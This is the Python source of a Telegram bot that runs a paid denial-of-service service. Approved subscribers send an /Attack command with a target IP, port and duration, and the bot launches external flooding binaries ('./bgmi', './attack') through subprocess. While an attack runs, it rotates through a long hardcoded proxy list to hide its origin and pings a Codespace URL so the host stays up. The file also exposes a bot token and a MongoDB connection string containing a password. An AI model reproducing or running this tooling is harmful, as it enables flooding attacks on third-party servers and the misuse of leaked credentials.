import os
import telebot
import json 
import requests
import logging
import time
import webbrowser
from pymongo import MongoClient
from datetime import datetime, timedelta
import certifi
ca = certifi.where()
import subprocess
import random

TOKEN = '7006920123:AAGNVQ2Y3cIV9MPZrx62LkL5VK2f3fp0itc'
MONGO_URI = os.getenv('MONGO_URI', 'mongodb+srv://yt300443:kzxC8V2kllJD3Cwe@cluster0.1uiewpz.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0')

# Define the URL of your Codespace environment
CODESPACE_URL = os.getenv('CODESPACE_URL', 'https://zany-guide-4j97wpx9q7g27g46.github.dev/')

REQUEST_INTERVAL = int(os.getenv('REQUEST_INTERVAL', 1))

# New environment variable for the proxy URL
PROXY_LIST_FILE = "proxy_list.txt"  # File to store the list of proxies

client1 = MongoClient(MONGO_URI, tlsCAFile=ca)
db = client1['yt300443']
users_collection = db.users
bot = telebot.TeleBot(TOKEN)
FORWARD_CHANNEL_ID = -1002057220295
CHANNEL_ID = -1002002949720
error_channel_id = -1002157131357

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
def update_proxy():
    with open(PROXY_LIST_FILE, "r") as file:
        proxies = file.readlines()
    proxy_url = random.choice(proxies).strip()
    os.environ['PROXY_URL'] = proxy_url

# Command to create a new proxy file and update the proxy URL
@bot.message_handler(commands=['update_proxy'])
def update_proxy_command(message):
    chat_id = message.chat.id
    try:
        # Generate proxy list and write to file
        with open(PROXY_LIST_FILE, "w") as file:
            # Add your logic to generate proxy list here
            # For demonstration, I'm adding sample proxies
            proxies = [
                "https://43.134.234.74:443",
                "https://175.101.18.21:5678",
                "https://179.189.196.52:5678",
"https://162.247.243.29:80",
"https://173.244.200.154:44302",
"https://173.244.200.156:64631",
"https://207.180.236.140:51167",
"https://123.145.4.15:53309",
"https://36.93.15.53:65445",
"https://1.20.207.225:4153",
"https://83.136.176.72:4145",
"https://115.144.253.12:23928",
"https://78.83.242.229:4145",
"https://128.14.226.130:60080",
"https://194.163.174.206:16128",
"https://110.78.149.159:4145",
"https://190.15.252.205:3629",
"https://101.43.191.233:2080",
"https://202.92.5.126:44879",
"https://221.211.62.4:1111",
"https://58.57.2.46:10800",
"https://45.228.147.239:5678",
"https://43.157.44.79:443",
"https://103.4.118.130:5678",
"https://37.131.202.95:33427",
"https://172.104.47.98:34503",
"https://216.80.120.100:3820",
"https://182.93.69.74:5678",
"https://8.210.150.195:26666",
"https://49.48.47.72:8080",
"https://37.75.112.35:4153",
"https://8.218.134.238:10802",	
"https://139.59.128.40:2016",
"https://45.196.151.120:5432",
"https://24.78.155.155:9090",
"https://212.83.137.239:61542",
"https://46.173.175.166:10801",
"https://103.196.136.158:7497",
"https://82.194.133.209:4153",
"https://210.4.194.196:80",
"https://88.248.2.160:5678",
"https://116.199.169.1:4145",
"https://77.99.40.240:9090",
"https://143.255.176.161:4153",
"https://172.99.187.33:4145",
"https://43.134.204.249:33126",
"https://185.95.227.244:4145",
"https://197.234.13.57:4145",
"https://81.12.124.86:5678",
"https://101.32.62.108:1080",
"https://192.169.197.146:55137",
"https://82.117.215.98:3629",
"https://202.162.212.164:4153",
"https://185.105.237.11:3128",
"https://123.59.100.247:1080",
"https://192.141.236.3:5678",
"https://182.253.158.52:5678",
"https://164.52.42.2:4145",
"https://185.202.7.161:1455",
"https://186.236.8.19:4145",
"https://36.67.147.222:4153",
"https://118.96.94.40:80",
"https://27.151.29.27:2080",
"https://181.129.198.58:5678",
"https://200.105.192.6:5678",
"https://103.86.1.255:4145",
"https://171.248.215.108:1080",
"https://181.198.32.211:4153",
"https://188.26.5.254:4145",
"https://34.120.231.30:80",
"https://103.23.100.1:4145",
"https://194.4.50.62:12334",
"https://201.251.155.249:5678",
"https://37.1.211.58:1080",
"https://86.111.144.10:4145",
"https://80.78.23.49:1080",
"https://154.73.85.1:57932",
"https://110.77.196.174:4145",
"https://112.78.164.62:5678",
"https://103.205.128.81:4145",
"https://31.172.66.22:20466",
"https://38.127.172.167:46656",
"https://84.241.22.125:4145",
"https://111.67.197.147:6666",
"https://188.243.99.234:1080",
"https://167.99.80.74:8080",
"https://96.9.88.94:4153",
"https://103.47.94.34:1080",
"https://186.251.255.141:31337",
"https://195.78.100.186:3629",
"https://50.235.117.234:39593",
"https://51.68.87.173:29212",
"https://185.205.249.24:45264",
"https://103.79.96.177:4153",
"https://185.250.148.110:6178",
"https://31.44.82.182:5678",
"https://98.162.25.23:4145",
"https://103.12.246.41:13494",
"https://78.38.108.199:1080",
"https://46.105.124.74:7497",
"https://123.114.207.105:8118",
"https://172.67.0.21:13335",
"https://104.238.234.48:3128",
"https://134.209.67.109:26000",
"https://209.126.6.159:80",
"https://66.135.227.178:4145",
"https://184.181.217.210:4145",
"https://107.180.95.93:32277",
"https://165.140.85.157:57779",
"https://152.26.229.86:9443",
"https://162.240.75.37:80",
"https://98.188.47.150:4145",
"https://68.183.143.134:80",
"https://167.99.174.59:80",
"https://74.50.91.22:3128",
"https://165.227.0.192:80",
"https://72.14.190.102:28337",
"https://72.210.221.197:4145",
"https://72.214.108.67:4145",
"https://184.178.172.17:4145",
"https://107.175.37.178:43029",
"https://205.201.49.160:53281",
"https://154.16.146.43:80",
"https://208.102.51.6:58208",
"https://174.77.111.198:49547",
"https://134.209.67.109:8085",
"https://199.229.254.129:4145",
"https://207.55.240.100:56011",
"https://143.198.226.25:80",
"https://137.184.6.203:8081",
"https://98.181.137.80:4145",
"https://208.65.90.21:4145",
"https://176.253.53.25:80",
"https://134.209.28.98:3128",
"https://149.102.130.120:80",
"https://51.89.173.40:35077",
"https://92.207.253.226:38157",
"https://212.110.188.207:34405",
"https://83.219.43.27:27702",
"https://20.58.43.148:2028",
"https://46.250.233.121:3128",
"https://159.65.84.243:443",
"https://81.134.57.82:3128",
"https://149.102.147.154:3128",
"https://80.194.38.106:3333",
"https://91.231.186.133:443",
"https://132.145.20.212:80",
"https://217.112.80.252:80",
"https://178.62.69.186:59113",
"https://212.110.188.204:34411",
"https://86.189.191.132:80",
"https://51.68.87.173:29212",
"https://38.60.196.242:3128",
"https://5.61.62.24:8118",
"https://80.169.243.234:1080",
"https://146.59.18.246:63455",
"https://46.250.242.57:3128",
"https://83.126.54.155:8080",
"https://138.68.129.50:80",
"https://188.241.45.142:2021",
"https://144.21.52.220:3128",
"https://77.68.77.181:80",
"https://103.163.244.4:83",
"https://103.8.164.16:80",
"https://154.26.130.175:3128",
"https://43.133.206.244:3128",
"https://103.37.111.253:18081",
"https://200.35.50.89:3028",
"https://43.133.173.132:3128",
"https://103.171.157.133:8080",
"https://84.19.178.40:3128",
"https://36.95.17.93:9812",
"https://203.150.128.44:8080",
"https://202.5.60.46:5020",
"https://138.59.165.85:1024",
"https://103.56.206.65:4995",
"https://139.59.35.142675"
            ]
            file.write("\n".join(proxies))
        # Update proxy URL
        update_proxy()
        bot.send_message(chat_id, "Proxy file created and PROXY_URL updated successfully.")
    except Exception as e:
        bot.send_message(chat_id, f"Failed to update proxy: {e}")

# Function to keep Codespace active
def keep_codespace_active():
    try:
        response = requests.get(CODESPACE_URL)
        if response.status_code == 200:
            print("Codespace is active.")
        else:
            print(f"Failed to keep Codespace active. Status code: {response.status_code}")
    except Exception as e:
        print(f"An error occurred: {str(e)}")
def is_user_admin(user_id, chat_id):
    try:
        user_status = bot.get_chat_member(chat_id, user_id).status
        return user_status in ['administrator', 'creator']
    except Exception as e:
        return False
    
@bot.message_handler(commands=['approve'])
def approve_user(message):
    user_idr = message.from_user.id
    chat_id = message.chat.id
    if not is_user_admin(user_idr, CHANNEL_ID):
        bot.send_message(chat_id, f"You are not authorised to use this command", parse_mode='Markdown')
        return
    command_parts = message.text.split()
    if len(command_parts) == 4:
        user_id, plan, days = int(command_parts[1]), int(command_parts[2]), int(command_parts[3])
        valid_until = (datetime.now() + timedelta(days=days)).date().isoformat()
        users_collection.update_one({"user_id": user_id}, {"$set": {"plan": plan, "valid_until": valid_until, "access_count": 0}}, upsert=True)
        bot.send_message(chat_id, f"User {user_id} approved with plan {plan} for {days} days.")
        bot.send_message(CHANNEL_ID,f"User {user_id} approved with plan {plan} for {days} days.")
    else:
        bot.send_message(chat_id, "Invalid command format. Use /approve <user_id> <plan> <days>.")

@bot.message_handler(commands=['disapprove'])
def disapprove_user(message):
    user_idr = message.from_user.id
    chat_id = message.chat.id
    if not is_user_admin(user_idr, CHANNEL_ID):
        bot.send_message(chat_id, f"You are not authorised to use this command", parse_mode='Markdown')
        return
    command_parts = message.text.split()
    if len(command_parts) == 2:
        user_id = int(command_parts[1])
        users_collection.update_one({"user_id": user_id}, {"$set": {"plan": 0, "valid_until": datetime.now().date().isoformat(), "access_count": 0}}, upsert=True)
        bot.send_message(chat_id, f"User {user_id} disapproved and reverted to free plan.")
        bot.send_message(CHANNEL_ID, f"User {user_id} disapproved and reverted to free plan.")
    else:
        bot.send_message(chat_id, "Invalid command format. Use /disapprove <user_id>.")

last_attack_time = {}
keyword_count = {}
BLOCK_THRESHOLD = 4
TIMEFRAME = 300
BLOCK_DURATION = 600
import threading

# Function to change the user's IP every 5 seconds
def change_ip_periodically(chat_id):
    while True:
        try:
            update_proxy()  # Update the proxy
           #3 bot.send_message(chat_id, "Your IP has been changed.")
            time.sleep(5)  # Sleep for 5 seconds before changing the IP again
        except Exception as e:
            send_error_log(chat_id, f"An error occurred while changing IP: {e}")



@bot.message_handler(commands=['start'])
def start_command(message):
    chat_id = message.chat.id
    user_id = message.from_user.id

    try:
        user_data = users_collection.find_one({"user_id": user_id})
        if not user_data:
            bot.send_message(chat_id, "You are not approved to use this bot. Please contact the administrator.")
            return
        
        plan, valid_until = user_data['plan'], user_data['valid_until']
        valid_until_date = datetime.strptime(valid_until, '%Y-%m-%d').date()
        remaining_days = (valid_until_date - datetime.now().date()).days

        if plan == 0 or remaining_days < 0:
            bot.send_message(chat_id, "Your subscription has expired or you are not approved. Please contact the administrator.")
            return

        bot.send_message(chat_id, 'To launch an attack, use the target host and port directly.\n\nFor example: /Attack 127.0.0.1 8080 120\nMake sure you have the target in sight before unleashing the chaos!\n\nRemember, with great power comes great responsibility. Use it wisely... or not! ðŸ˜ˆ')
    except Exception as e:
        bot.send_message(chat_id, f"An error occurred: {str(e)}")
@bot.message_handler(commands=['format'])
def format_command(message):
    chat_id = message.chat.id
    bot.send_message(chat_id, "Command format: use /Attack target_ip target_port time")

broadcast_messages = {}

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    global error, success
    error, success = 0, 0
    admin_user_id = message.from_user.id
    chat_id = message.chat.id
    if not is_user_admin(admin_user_id, CHANNEL_ID):
        bot.send_message(chat_id, "You are not authorized to use this command", parse_mode='Markdown')
        return

    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) < 2:
        bot.send_message(chat_id, "Invalid command format. Use /broadcast <message>")
        return

    broadcast_msg = command_parts[1]
    all_users = users_collection.find({}, {'user_id': 1, '_id': 0})
    user_ids = [user['user_id'] for user in all_users]

    for user_id in user_ids:
        try:
            msg = bot.send_message(user_id, broadcast_msg)
            broadcast_messages[user_id] = msg.message_id
            success += 1
        except Exception as e:
            error += 1

    send_error_log(chat_id, f"Failed to send message to {error} users. Successfully sent to {success} users.")
    bot.send_message(chat_id, f"Broadcast message sent to {success} users.")

@bot.message_handler(commands=['deletecast'])
def delete_broadcast_messages(message):
    admin_user_id = message.from_user.id
    chat_id = message.chat.id
    global error, success
    error, success = 0, 0
    if not is_user_admin(admin_user_id, CHANNEL_ID):
        bot.send_message(chat_id, "You are not authorized to use this command", parse_mode='Markdown')
        return

    for user_id, msg_id in broadcast_messages.items():
        try:
            bot.delete_message(user_id, msg_id)
            success += 1
        except Exception as e:
            error += 1

    send_error_log(chat_id, f"Failed to delete message to {error} users. Successfully deleted from {success} users.")
    bot.send_message(chat_id, f"Broadcast message deleted from {success} users.")
@bot.message_handler(commands=['show_proxy'])
def show_proxy_command(message):
    chat_id = message.chat.id
    try:
        with open(PROXY_LIST_FILE, "r") as file:
            current_proxy = os.getenv('PROXY_URL')
            bot.send_message(chat_id, f"Current Proxy: {current_proxy}")
    except Exception as e:
        bot.send_message(chat_id, f"Failed to retrieve current proxy: {e}")
@bot.message_handler(commands=['Attack'])
def attack_command(message):
    chat_id = message.chat.id
    # Start a new thread to change IP periodically
    threading.Thread(target=change_ip_periodically, args=(chat_id,), daemon=True).start()
    bot.send_message(chat_id, "Changing your IP every 5 seconds.")
    user_id = message.from_user.id
    chat_id = message.chat.id
    try:
        user_data = users_collection.find_one({"user_id": user_id})
        if not user_data:
            users_collection.insert_one({
                "user_id": user_id,
                "plan": 0,
                "access_count": 0,
                "valid_until": datetime.now().date().isoformat()
            })
            user_data = users_collection.find_one({"user_id": user_id})

        if user_data['valid_until'] >= datetime.now().date().isoformat():
            if user_data['plan'] == 499 or (user_data['plan'] == 99 and user_data['access_count'] < 10):
                if user_data['plan'] == 99:
                    users_collection.update_one({"user_id": user_id}, {"$inc": {"access_count": 1}})

                if is_user_admin(user_id, CHANNEL_ID):
                    bypass_cooldown = True
                else:
                    bypass_cooldown = False
                
                if not bypass_cooldown and message.from_user.id in last_attack_time:
                    cooldown_remaining = last_attack_time[message.from_user.id] + 500 - time.time()
                    if cooldown_remaining > 0:
                        bot.send_message(chat_id, f"You need to wait {int(cooldown_remaining)} seconds before starting another attack.")
                        return
                    
                bot.forward_message(FORWARD_CHANNEL_ID, message.chat.id, message.message_id)
                args = message.text.split()[1:]
                if len(args) != 3:
                    bot.send_message(chat_id, "Invalid command format. Please use: /Attack target_ip target_port time")
                    return
                target_ip, target_port, duration = args 

                duration = min(300, int(duration))
                
                current_time = time.time()
                last_attack = last_attack_time.get(user_id, 0)
                if not is_user_admin(user_id, CHANNEL_ID) and current_time - last_attack < 200:
                    wait_time = int(200 - (current_time - last_attack))
                    bot.send_message(chat_id, f"Please wait {wait_time} seconds before starting another attack.")
                    return
                
                try:
                    # Set the proxy for the attack command
                 #   proxy_command = f"export http_proxy={PROXY_URL} && export https_proxy={PROXY_URL} && "

                    full_command = f"./bgmi {target_ip} {target_port} {duration} 200"
                    time.sleep(5)
                    full_attack = f"./attack {target_ip} {target_port} {duration} 200"
                    subprocess.Popen(full_attack, shell=True)
                    subprocess.Popen(full_command, shell=True)
                    bot.reply_to(message, f"Attack started ðŸ’¥\n\nHost: {target_ip}\nPort: {target_port}\nTime: {duration}")
                    last_attack_time[user_id] = current_time
                except Exception as e:
                    bot.reply_to(message, f" Attack Unsuccessfull â„ï¸\n\nError: {e}")
    except Exception as e:
        print(e)

@bot.message_handler(commands=['find_active_ips'])
def find_active_ips(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    try:
        user_data = users_collection.find_one({"user_id": user_id})
        if not user_data or user_data['plan'] == 0:
            bot.send_message(chat_id, "You do not have access to this command.")
            return

        if user_data['valid_until'] >= datetime.now().date().isoformat():
            if user_data['plan'] == 499 or (user_data['plan'] == 99 and user_data['access_count'] < 10):
                if user_data['plan'] == 99:
                    users_collection.update_one({"user_id": user_id}, {"$inc": {"access_count": 1}})

                try:
                    result = subprocess.run(['./ip'], capture_output=True, text=True)
                    active_ips = result.stdout.strip()
                    if active_ips:
                        bot.send_message(chat_id, f"Active UDP IPs and Ports:\n\n{active_ips}")
                    else:
                        bot.send_message(chat_id, "No active UDP IPs and Ports found.")
                except Exception as e:
                    bot.send_message(chat_id, f"Failed to find active UDP IPs and Ports.\n\nError: {e}")
    except Exception as e:
        bot.send_message(chat_id, f"An error occurred: {e}")

def send_error_log(chat_id, error_message):
    bot.send_message(chat_id, error_message)
    bot.send_message(error_channel_id, error_message)

def send_error_message(message):
    try:
        bot.send_message(error_channel_id, message)
    except Exception as e:
        logging.error(f"Error sending error message: {e}")

@bot.message_handler(commands=['credits'])
def send_credits(message):
    chat_id = message.chat.id
    bot.send_message(chat_id, "This bot was created by tarun. All rights reserved.")

def keep_codespace_active():
    try:
        response = requests.get(CODESPACE_URL)
        if response.status_code == 200:
            print("Codespace is active.")
        else:
            print(f"Failed to keep Codespace active. Status code: {response.status_code}")
    except Exception as e:
        print(f"An error occurred: {str(e)}")

if __name__ == "__main__":
    print("Starting Codespace activity keeper and Telegram bot...")
    while True:
        try:
            keep_codespace_active()
            bot.polling(none_stop=True)
        except Exception as e:
            send_error_message(f"An error occurred while polling: {e}")
        print(f"Waiting for {REQUEST_INTERVAL} seconds before the next request...")
        time.sleep(REQUEST_INTERVAL)